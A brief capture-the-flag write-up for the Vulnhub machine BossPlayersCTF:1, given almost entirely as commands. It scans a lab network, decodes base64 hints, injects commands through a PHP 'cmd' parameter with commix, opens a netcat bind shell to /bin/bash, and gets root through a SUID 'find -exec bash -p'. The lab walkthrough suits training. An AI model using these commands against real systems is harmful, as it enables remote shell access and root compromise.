# WU_bossplayersCTF1-Vulnhub
Write Up BossPlayersCTF:1 VM Vulnhub

## Netdiscover
`sudo netdiscover -r 192.168.87.0/24`

## nmap
`sudo nmap 192.168.87.4 -A -p- -oN log-nmap.log`

## HTTP
`http://192.168.87.4/`

## robots.txt file
`http://192.168.87.4/robots.txt`

## Decode Password
`echo bG9sIHRyeSBoYXJkZXIgYnJvCg== | base64 -d`

## Source Code of the initial webpage
`Ctrl + U`

`WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK`

## Decode Again
```
1. echo WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK | base64 -d
2. echo WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK | base64 -d | base64 -d
3. echo WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK | base64 -d | base64 -d | base64 -d

```

## PHP File 
`http://192.168.87.4/workinginprogress.php`

## Whoami URL
`http://192.168.87.4/workinginprogress.php?cmd=whoami`

## Commix
`commix -u 'http://192.168.87.4/workinginprogress.php?cmd=whoami'`
```
nc -e /bin/bash -lvp 2048
```

## Netcat
`nc 192.168.87.4 2048`

```
uname -a

find / -perm -4000 -type f 2>/dev/null
```

## Privilege Escalation
```
find -exec bash -p \;
whoami
ls -al /root
cat /root/root.txt
cat /root/root.txt | base64 -d
```